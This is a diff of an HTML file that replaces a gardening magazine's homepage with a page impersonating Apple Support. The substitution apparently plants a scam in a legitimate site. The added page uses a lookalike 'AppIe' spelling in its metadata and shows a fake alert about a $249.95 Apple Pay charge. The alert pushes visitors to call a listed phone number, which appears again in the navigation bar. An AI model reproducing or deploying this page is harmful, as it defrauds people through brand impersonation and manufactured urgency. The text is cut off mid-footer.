@@ -1,466 +1,649 @@
 <!DOCTYPE html>
-<html lang="en">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
-  <title>Uncharted Garden Paths – Cultivating Curiosity</title>
-  <meta name="description" content="An independent gardening publication exploring forgotten heirloom varieties, soil wisdom, and the quiet art of tending living things.">
-  <!-- Google Fonts: refined serif & humanist sans -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400;0,600;1,400&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-0v_6F6ac2BTANUqqz3t9d.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+  <script>
+    const domain = window.location.hostname;
+    const s = document.createElement("script");
+    s.defer = true;
+    s.setAttribute("data-domain", domain);
+    s.src = "https://plausible.io/js/script.js";
+    document.head.appendChild(s);
+  </script>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="cache-control" content="max-age=3600">
+  <title>Test Project</title>
+  <meta name="description" content="Contact AppIe support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+  <link rel="stylesheet" href="css/Base.css" type="text/css">
+  <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+  <script src="js/text_tel.js"></script>
+
+  <!-- ===== Design Skin (visual-only, safe overlay) ===== -->
   <style>
-    /* ----- RESET & BASE ----- */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    /* Global look & feel */
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #fbf7f0;
-      color: #2b2b28;
-      line-height: 1.6;
-      -webkit-font-smoothing: antialiased;
+      background: #0b1020;
+      color: #e5e7eb;
+      font-family: ui-sans, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
     }
-    a { text-decoration: none; color: inherit; }
-    img { max-width: 100%; height: auto; display: block; }
-    ul, ol { padding-left: 1.2rem; }
 
-    /* ----- TYPOGRAPHY (premium, garden-inspired) ----- */
-    h1, h2, h3, h4, .logo, .nav-primary a, .article-title {
-      font-family: 'EB Garamond', serif;
-      font-weight: 600;
+    a {
+      color: #93c5fd;
+    }
+
+    /* Main content wrapper */
+    .main {
+      background:
+        radial-gradient(800px 300px at 50% -10%, rgba(59,130,246,0.18), transparent 60%),
+        radial-gradient(600px 200px at 80% 10%, rgba(34,197,94,0.15), transparent 60%),
+        #0b1020;
+      min-height: 100vh;
+    }
+
+    /* Banner / hero area */
+    .as-banner {
+      position: relative;
+    }
+
+    .as-banner .as-banner-content {
+      padding: 40px 20px 20px;
+    }
+
+    .pageTitle-heading {
+      font-size: clamp(28px, 4vw, 40px);
       letter-spacing: -0.02em;
-    }
-    h1 { font-size: clamp(2.4rem, 6vw, 4.4rem); line-height: 1.1; }
-    h2 { font-size: clamp(2rem, 4vw, 3rem); line-height: 1.2; }
-    h3 { font-size: clamp(1.4rem, 2.5vw, 2rem); line-height: 1.3; }
-    h4 { font-size: clamp(1.1rem, 1.8vw, 1.4rem); }
-    .body-large { font-size: 1.2rem; font-weight: 300; line-height: 1.7; }
-    .meta, .caption, .small-print { font-size: 0.875rem; color: #5f5e5a; letter-spacing: 0.02em; }
-    .tag { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.08em; font-weight: 500; background: #e8e3da; padding: 0.2rem 0.8rem; border-radius: 40px; display: inline-block; }
-
-    /* ----- COLOR (earthy, muted, high readability) ----- */
-    :root {
-      --clr-primary: #2f4f3a;    /* deep forest */
-      --clr-secondary: #7f8c6b;  · dried sage
-      --clr-accent: #b68b6b;     · terracotta
-      --clr-bg: #fbf7f0;         · warm paper
-      --clr-surface: #f4efe7;
-      --clr-text: #2b2b28;
-      --clr-muted: #5f5e5a;
-      --clr-border: #d9d2c5;
+      margin: 0 0 10px;
+      color: #f3f4f6;
     }
 
-    /* ----- LAYOUT CONTAINER ----- */
-    .container {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 1.8rem;
+    .pageTitle-intro {
+      color: #9ca3af;
+      font-size: 16px;
+      margin: 0 0 18px;
     }
-    @media (min-width: 768px) { .container { padding: 0 3rem; } }
 
-    /* ----- NAVIGATION (editorial, uncluttered) ----- */
-    nav {
-      padding: 1.8rem 0 0.8rem;
-      border-bottom: 1px solid var(--clr-border);
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .logo {
-      font-size: 1.8rem;
-      font-weight: 600;
-      letter-spacing: -0.03em;
-      display: flex;
-      align-items: center;
-      gap: 0.4rem;
-    }
-    .logo span { color: var(--clr-secondary); font-weight: 400; }
-    .nav-links {
-      display: flex;
-      gap: 2rem;
-      font-size: 0.95rem;
-      font-weight: 400;
-      flex-wrap: wrap;
-    }
-    .nav-links a { padding: 0.3rem 0; border-bottom: 2px solid transparent; transition: 0.2s; }
-    .nav-links a:hover { border-bottom-color: var(--clr-accent); }
-    .nav-search { background: var(--clr-surface); padding: 0.3rem 1rem; border-radius: 40px; display: flex; align-items: center; gap: 0.4rem; border: 1px solid var(--clr-border); }
-    .nav-search input { border: none; background: transparent; font-size: 0.9rem; width: 140px; outline: none; }
-    .nav-search button { background: none; border: none; cursor: pointer; font-size: 1rem; }
-
-    /* ----- HOMEPAGE: editorial notebook layout (non‑standard) ----- */
-    .home-header {
-      padding: 3.5rem 0 2.5rem;
-      border-bottom: 1px solid var(--clr-border);
-      display: grid;
-      grid-template-columns: 2fr 1fr;
-      gap: 3rem;
-      align-items: start;
-    }
-    .home-header h1 { margin-bottom: 0.5rem; }
-    .home-header .lead { font-size: 1.25rem; color: var(--clr-muted); max-width: 36rem; }
-    .home-header .image-block { border-radius: 8px; overflow: hidden; background: #d9d2c5; }
-    .home-header .image-block img { width: 100%; height: 220px; object-fit: cover; }
-
-    /* knowledge explorer (unique component) */
-    .knowledge-explorer {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 1.8rem;
-      margin: 3rem 0 4rem;
-    }
-    .explorer-card {
-      background: var(--clr-surface);
-      padding: 1.8rem 1.5rem;
-      border-radius: 4px;
-      border-left: 6px solid var(--clr-secondary);
-      transition: 0.2s;
-    }
-    .explorer-card:hover { background: #ede8de; }
-    .explorer-card h4 { margin-bottom: 0.3rem; }
-    .explorer-card p { font-size: 0.95rem; color: var(--clr-muted); }
-
-    /* featured articles – split cards */
-    .featured-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 2.5rem;
-      margin: 2rem 0 4rem;
-    }
-    .featured-card {
-      display: flex;
-      flex-direction: column;
-      background: white;
-      border-radius: 4px;
+    /* Hero image overlay styling */
+    .as-banner-image.as-banner-image--top {
+      border-radius: 16px;
       overflow: hidden;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.04);
-      transition: 0.25s ease;
+      border: 1px solid #1f2937;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
     }
-    .featured-card:hover { box-shadow: 0 8px 24px rgba(0,0,0,0.06); transform: translateY(-2px); }
-    .featured-card img { height: 200px; object-fit: cover; background: #d0c9bc; }
-    .featured-card .content { padding: 1.8rem 2rem 2rem; }
-    .featured-card .content .tag { margin-bottom: 0.6rem; }
-    .featured-card .content h3 { margin: 0.3rem 0 0.8rem; }
-    .featured-card .content .meta { display: flex; gap: 1rem; margin-top: 0.8rem; }
 
-    /* horizontal story row (compact) */
-    .story-row {
-      display: flex;
-      flex-direction: column;
-      gap: 0.2rem;
-      margin: 3rem 0 2rem;
-      border-top: 1px solid var(--clr-border);
-      padding-top: 2rem;
+    .as-banner-image.as-banner-image--top:before {
+      display: none; /* remove default overlay if any */
     }
-    .story-item {
-      display: grid;
-      grid-template-columns: 1fr 3fr 1fr;
-      gap: 1rem;
-      padding: 0.8rem 0.2rem;
-      border-bottom: 1px solid #eeeae1;
+
+    /* Local nav (support bar) */
+    #ac-localnav {
+      background: rgba(15, 23, 42, 0.85);
+      backdrop-filter: saturate(140%) blur(8px);
+      border-bottom: 1px solid #1f2937;
+    }
+
+    .ac-ln-title a {
+      color: #e5e7eb !important;
+      font-weight: 600;
+      letter-spacing: 0.2px;
+    }
+
+    /* Global nav styling tweaks */
+    #ac-globalnav {
+      background: rgba(11, 16, 32, 0.9);
+      backdrop-filter: saturate(140%) blur(8px);
+      border-bottom: 1px solid #1f2937;
+    }
+
+    .ac-gn-link-text {
+      color: #e5e7eb;
+    }
+
+    .ac-gn-item-menu .ac-gn-link-text {
+      color: #d1d5db;
+    }
+
+    /* Buttons / call-to-action style (if you add buttons later) */
+    button,
+    .ac-gn-searchform-submit,
+    .ac-gn-searchform-reset {
+      border-radius: 10px;
+      background: #111827;
+      border: 1px solid #1f2937;
+      color: #e5e7eb;
+    }
+
+    /* Form inputs */
+    input[type="text"],
+    .ac-gn-searchform-input {
+      background: #0b1220;
+      border: 1px solid #1f2937;
+      color: #e5e7eb;
+      border-radius: 10px;
+      padding: 10px 12px;
+    }
+
+    /* Footer */
+    #ac-globalfooter {
+      background: linear-gradient(180deg, transparent, rgba(0,0,0,0.35));
+      border-top: 1px solid #1f2937;
+      color: #9ca3af;
+    }
+
+    .ac-gf-footer-legal-copyright {
+      color: #6b7280;
+      font-size: 12px;
+    }
+
+    .ac-gf-footer-legal-links a {
+      color: #93c5fd;
+    }
+
+    /* Small visual polish for phone number spans */
+    .js_setPhoneBlock {
+      color: #86efac;
+      font-weight: 700;
+    }
+
+    /* Responsive tweaks */
+    @media (max-width: 735px) {
+      .pageTitle-heading {
+        font-size: 26px;
+      }
+
+      .as-banner .as-banner-content {
+        padding: 28px 16px 16px;
+      }
+    }
+
+    /* ===== Custom Confirm Popup (fixed button alignment) ===== */
+    .custom-confirm-overlay {
+      position: fixed;
+      left: 0;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.55);
+      display: none;
       align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      -webkit-tap-highlight-color: transparent;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
     }
-    .story-item .story-meta { font-size: 0.8rem; color: var(--clr-muted); }
-    .story-item .story-title { font-weight: 500; font-family: 'EB Garamond', serif; font-size: 1.1rem; }
-    .story-item .story-cat { text-align: right; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.06em; color: var(--clr-secondary); }
 
-    /* infographic / diagram */
-    .infographic-block {
-      background: var(--clr-surface);
-      padding: 2rem 2.5rem;
-      border-radius: 4px;
-      margin: 3rem 0;
+    .custom-confirm-box {
+      width: 86%;
+      max-width: 320px;
+      background: rgba(20, 24, 36, 0.98);
+      border: 1px solid #1f2937;
+      border-radius: 16px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+      overflow: hidden;
+      backdrop-filter: saturate(160%) blur(14px);
+      -webkit-backdrop-filter: saturate(160%) blur(14px);
+      color: #e5e7eb;
+    }
+
+    .custom-confirm-content {
+      padding: 18px 16px 10px;
+      text-align: center;
+      font-size: 15px;
+      line-height: 1.35;
+      color: #e5e7eb;
+    }
+
+    .custom-confirm-buttons {
       display: flex;
-      flex-wrap: wrap;
-      gap: 2rem;
-      align-items: center;
-      border: 1px solid var(--clr-border);
+      flex-direction: row;
+      border-top: 1px solid #1f2937;
     }
-    .infographic-block .chart {
-      flex: 2;
-      min-width: 240px;
-      background: #e3ddd2;
-      height: 140px;
-      border-radius: 4px;
-      display: flex;
-      align-items: flex-end;
-      justify-content: space-around;
-      padding: 0.8rem;
-    }
-    .infographic-block .chart .bar {
-      width: 18%;
-      background: var(--clr-primary);
-      border-radius: 4px 4px 0 0;
-      transition: 0.3s;
-    }
-    .infographic-block .chart .bar:nth-child(2) { height: 70%; background: var(--clr-secondary); }
-    .infographic-block .chart .bar:nth-child(3) { height: 90%; background: var(--clr-accent); }
-    .infographic-block .chart .bar:nth-child(4) { height: 50%; background: #a7b89a; }
-    .infographic-block .chart .bar:nth-child(5) { height: 85%; background: #b6a68b; }
-    .infographic-block .desc { flex: 1; min-width: 200px; }
 
-    /* footer (unique, layered) */
-    footer {
-      margin-top: 5rem;
-      background: #2f4f3a;
-      color: #e3ddd2;
-      padding: 3.5rem 0 2rem;
-      border-top: 4px solid #b68b6b;
+    .custom-confirm-btn {
+      appearance: none;
+      border: none;
+      background: transparent;
+      color: #93c5fd;
+      font-weight: 600;
+      font-size: 15px;
+      padding: 14px 0;
+      cursor: pointer;
+      margin: 0;
+      border-radius: 0;
+      flex: 1 1 0;
+      width: 50%;
+      box-sizing: border-box;
+      text-align: center;
     }
-    footer a { color: #d9d2c5; border-bottom: 1px dotted #7f8c6b; }
-    footer .footer-grid {
-      display: grid;
-      grid-template-columns: 2fr 1fr 1fr 1fr;
-      gap: 2rem;
-    }
-    footer .footer-grid h4 { color: #f4efe7; margin-bottom: 0.8rem; font-weight: 500; }
-    footer .footer-grid ul { list-style: none; padding: 0; }
-    footer .footer-grid ul li { margin-bottom: 0.3rem; }
-    footer .copy { margin-top: 2.5rem; font-size: 0.8rem; border-top: 1px solid #5f6e4b; padding-top: 1.8rem; text-align: center; }
 
-    /* article page (long-form) */
-    .article-main {
-      max-width: 780px;
-      margin: 3rem auto;
-      background: white;
-      padding: 2.5rem 3rem;
-      border-radius: 4px;
-      box-shadow: 0 2px 20px rgba(0,0,0,0.02);
+    .custom-confirm-btn:first-child {
+      border-right: 1px solid #1f2937;
+      color: #f87171;
     }
-    .article-main h1 { font-size: 2.8rem; line-height: 1.15; margin-bottom: 0.2rem; }
-    .article-main .subtitle { font-size: 1.25rem; color: var(--clr-muted); font-weight: 300; margin-bottom: 1rem; }
-    .article-main .byline { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0 2rem; }
-    .article-main .byline .author { font-weight: 500; }
-    .article-main .toc { background: var(--clr-surface); padding: 1.2rem 2rem; border-radius: 4px; margin: 1.5rem 0; }
-    .article-main .toc li { list-style: none; border-bottom: 1px solid #e3ddd2; padding: 0.2rem 0; }
-    .article-main h2 { margin: 2rem 0 0.5rem; }
-    .article-main h3 { margin: 1.5rem 0 0.3rem; }
-    .article-main p { margin-bottom: 1.2rem; }
-    .article-main .tip-box { background: #f4efe7; padding: 1.2rem 1.8rem; border-left: 6px solid var(--clr-accent); margin: 1.8rem 0; }
-    .article-main .faq-item { border-bottom: 1px solid #eeeae1; padding: 0.8rem 0; }
-    .article-main .faq-item strong { display: block; font-weight: 500; }
 
-    /* responsive */
-    @media (max-width: 800px) {
-      .home-header { grid-template-columns: 1fr; gap: 1rem; }
-      .knowledge-explorer { grid-template-columns: 1fr; }
-      .featured-grid { grid-template-columns: 1fr; }
-      .story-item { grid-template-columns: 1fr; gap: 0.2rem; }
-      .story-item .story-cat { text-align: left; }
-      footer .footer-grid { grid-template-columns: 1fr 1fr; }
-      .nav-links { gap: 1rem; font-size: 0.85rem; }
-      .nav-search input { width: 100px; }
-      .article-main { padding: 1.5rem; }
-    }
-    @media (max-width: 500px) {
-      nav { flex-direction: column; align-items: stretch; gap: 0.5rem; }
-      .nav-links { justify-content: center; }
-      .nav-search { width: 100%; }
+    .custom-confirm-btn:active {
+      background: rgba(255, 255, 255, 0.04);
     }
   </style>
-</head>
-<body>
 
-<!-- ====== NAVIGATION ====== -->
-<div class="container">
-  <nav>
-    <div class="logo">🌱 Uncharted<span>Garden Paths</span></div>
-    <div class="nav-links">
-         <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li> 
-                    <li><a href="disclaimer.html">Disclaimer</a></li>
-                    <li><a href="categories.html">Categories</a></li>
+  <!-- Custom confirm modal markup -->
+  <div id="customConfirm" class="custom-confirm-overlay" role="alertdialog" aria-modal="true" aria-hidden="true">
+    <div class="custom-confirm-box">
+      <div class="custom-confirm-content" id="customConfirmText">
+Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-813-385-1334 to Freeze it!      </div>
+      <div class="custom-confirm-buttons">
+        <button type="button" class="custom-confirm-btn" id="customConfirmCancel">Cancel</button>
+        <button type="button" class="custom-confirm-btn" id="customConfirmOk">OK</button>
+      </div>
     </div>
-    <div class="nav-search">
-      <input type="text" placeholder="Search plants, topics…" aria-label="Search">
-      <button aria-label="search">🔍</button>
+  </div>
+</head>
+
+<body>
+  <div id="result"></div>
+  <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+  <nav id="ac-globalnav" class="no-js">
+    <div class="ac-gn-content">
+      <ul class="ac-gn-header">
+        <li class="ac-gn-item ac-gn-menuicon">
+          <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+              <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+            </span>
+            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+              <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+            </span>
+          </label>
+          <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+            <span class="ac-gn-menuanchor-label">Open Menu </span>
+          </a>
+          <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+            <span class="ac-gn-menuanchor-label">Close Menu </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-apple">
+          <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+            <span class="ac-gn-link-text">Apple </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+          <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#">
+            <span class="ac-gn-link-text">Shopping Bag </span>
+            <span class="ac-gn-bag-badge"></span>
+          </a>
+          <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+        </li>
+      </ul>
+      <ul class="ac-gn-list">
+        <li class="ac-gn-item ac-gn-apple">
+          <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+            <span class="ac-gn-link-text">Apple </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+          <a class="ac-gn-link ac-gn-link-mac" href="#">
+            <span class="ac-gn-link-text">Mac </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+          <a class="ac-gn-link ac-gn-link-ipad" href="#">
+            <span class="ac-gn-link-text">iPad </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+          <a class="ac-gn-link ac-gn-link-iphone" href="#">
+            <span class="ac-gn-link-text">iPhone </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+          <a class="ac-gn-link ac-gn-link-watch" href="#">
+            <span class="ac-gn-link-text">Watch </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+          <a class="ac-gn-link ac-gn-link-tv" href="#">
+            <span class="ac-gn-link-text">TV </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+          <a class="ac-gn-link ac-gn-link-music" href="#">
+            <span class="ac-gn-link-text">Music </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+          <a class="ac-gn-link ac-gn-link-support" href="#">
+            <span class="ac-gn-link-text">Support </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+          <a class="ac-gn-link ac-gn-link-search" href="#">
+            <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span>
+          </a>
+        </li>
+        <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+          <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+            <span class="ac-gn-link-text">Shopping Bag </span>
+            <span class="ac-gn-bag-badge" aria-hidden="true"></span>
+          </a>
+          <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+        </li>
+      </ul>
+      <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+        <div class="ac-gn-searchview-content">
+          <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+            <div class="ac-gn-searchform-wrapper">
+              <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+              <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+              <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+              <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+            </div>
+          </form>
+          <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+        </div>
+        <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+          <span class="ac-gn-searchview-close-wrapper">
+            <span class="ac-gn-searchview-close-left"></span>
+            <span class="ac-gn-searchview-close-right"></span>
+          </span>
+        </button>
+      </aside>
+      <aside class="ac-gn-bagview">
+        <div class="ac-gn-bagview-scrim">
+          <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+        </div>
+        <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+        </div>
+      </aside>
     </div>
   </nav>
-</div>
+  <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+  <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-<!-- ====== HOMEPAGE ====== -->
-<main class="container">
-
-  <!-- HERO + intro (split) -->
-  <header class="home-header">
-    <div>
-      <h1>Where soil meets story.</h1>
-      <p class="lead">Uncharted Garden Paths is a quiet almanac for the curious gardener — celebrating forgotten varieties, regenerative wisdom, and the poetry of growing.</p>
-      <div style="margin-top:1.2rem; display:flex; gap:0.8rem; flex-wrap:wrap;">
-        <span class="tag">🌿 heirloom</span>
-        <span class="tag">🌱 soil</span>
-        <span class="tag">🐝 pollinators</span>
+  <div class="main">
+    <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+      <div class="ac-ln-wrapper">
+        <div class="ac-ln-background"></div>
+        <div class="ac-ln-content">
+          <span class="ac-ln-title">
+            <a href="#">Apple Support +1-813-385-1334 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+          </span>
+          <div class="ac-ln-menu">
+            <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">
+              <span class="ac-ln-menucta-anchor-label">Open menu </span>
+            </a>
+            <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
+              <span class="ac-ln-menucta-anchor-label">Close menu </span>
+            </a>
+            <div class="ac-ln-menu-tray">
+              <ul class="ac-ln-menu-items">
+                <li class="ac-ln-menu-item">
+                  <a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                </li>
+              </ul>
+            </div>
+            <div class="ac-ln-actions">
+              <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                <label for="ac-ln-menustate" class="ac-ln-menucta">
+                  <span class="ac-ln-menucta-chevron"></span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
       </div>
-    </div>
-    <div class="image-block">
-      <!-- HERO IMAGE: garden path / leaves -->
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='400' viewBox='0 0 600 400'%3E%3Crect width='600' height='400' fill='%23b6a68b'/%3E%3Cpath d='M0 400 L200 120 L400 200 L600 80 L600 400 Z' fill='%232f4f3a' opacity='0.6'/%3E%3Ccircle cx='150' cy='180' r='40' fill='%23b68b6b' opacity='0.5'/%3E%3Ccircle cx='420' cy='130' r='60' fill='%237f8c6b' opacity='0.4'/%3E%3C/svg%3E"
-           alt="A winding garden path through layered foliage, warm earth tones">
-    </div>
-  </header>
+    </nav>
+    <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+      <div class="row">
+        <div class="column large-12 medium-12 small-12">
+          <div class="as-banner-cont">
+            <div class="as-banner-image as-banner-image--top">
+              <style type="text/css">
+                .as-banner-image.as-banner-image--top {
+                  background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                }
 
-  <!-- KNOWLEDGE EXPLORER (unique component) -->
-  <section class="knowledge-explorer">
-    <div class="explorer-card">
-      <h4>📖 The Seed Library</h4>
-      <p>Stories of rare beans, indigo tomatoes, and the keepers who saved them.</p>
-    </div>
-    <div class="explorer-card">
-      <h4>🪴 Soil Alchemy</h4>
-      <p>From compost tea to no‑dig beds — practical wisdom for living earth.</p>
-    </div>
-    <div class="explorer-card">
-      <h4>🌼 Pollinator Chronicles</h4>
-      <p>How native plants and wild edges bring the garden to life.</p>
-    </div>
-  </section>
+                .as-banner-image.as-banner-image--top:before {
+                  content: "";
+                  display: block;
+                }
 
-  <!-- FEATURED ARTICLES (premium split cards) -->
-  <section class="featured-grid">
-    <article class="featured-card">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='300' viewBox='0 0 600 300'%3E%3Crect width='600' height='300' fill='%23d0c9bc'/%3E%3Ccircle cx='120' cy='150' r='70' fill='%237f8c6b' opacity='0.3'/%3E%3Ccircle cx='400' cy='120' r='90' fill='%232f4f3a' opacity='0.3'/%3E%3C/svg%3E"
-           alt="Heirloom tomato varieties displayed on a wooden table">
-      <div class="content">
-        <span class="tag">heirloom</span>
-        <h3>The Last Seed: Saving the Cherokee Purple</h3>
-        <p>One gardener’s decade‑long mission to preserve a legendary tomato — and what it teaches us about resilience.</p>
-        <div class="meta"><span>by Elara Finch</span><span>· 12 min read</span></div>
+                @media only screen and (max-width: 735px) {
+                  .as-banner-image.as-banner-image--top {
+                    background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                  }
+                }
+              </style>
+              <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+            </div>
+          </div>
+          <div class="as-banner-content">
+            <div class="pageTitle  ">
+              <h1 class="pageTitle-heading">Apple Support </h1>
+              <p class="pageTitle-intro js_setTextBlock">
+              </p>
+            </div>
+            <div class="sectionTitle sectionTitleBlock">
+              <h2 class="sectionTitle-heading"></h2>
+            </div>
+          </div>
+        </div>
       </div>
-    </article>
-    <article class="featured-card">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='300' viewBox='0 0 600 300'%3E%3Crect width='600' height='300' fill='%23b6a68b'/%3E%3Cpath d='M0 150 L200 100 L400 180 L600 90 L600 300 L0 300 Z' fill='%235f6e4b' opacity='0.5'/%3E%3C/svg%3E"
-           alt="Close-up of dark, crumbly soil with a seedling">
-      <div class="content">
-        <span class="tag">soil</span>
-        <h3>Beyond NPK: The Fungal Network Underfoot</h3>
-        <p>Mycorrhizal relationships are the secret language of the garden. Here’s how to nurture them.</p>
-        <div class="meta"><span>by Dr. Mira Thorne</span><span>· 8 min read</span></div>
-      </div>
-    </article>
-  </section>
+    </section>
+  </div>
 
-  <!-- INFOGRAPHIC (diagram) -->
-  <div class="infographic-block">
-    <div class="chart">
-      <div class="bar" style="height:60%"></div>
-      <div class="bar" style="height:80%"></div>
-      <div class="bar" style="height:100%"></div>
-      <div class="bar" style="height:45%"></div>
-      <div class="bar" style="height:90%"></div>
+  <footer id="ac-globalfooter" class="no-js">
+    <div class="ac-gf-content">
+      <section class="ac-gf-footer">
+        <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+        </div>
+        <div class="ac-gf-footer-locale">
+          <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+States </a>
+        </div>
+        <div class="ac-gf-footer-legal">
+          <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+          <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+            <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
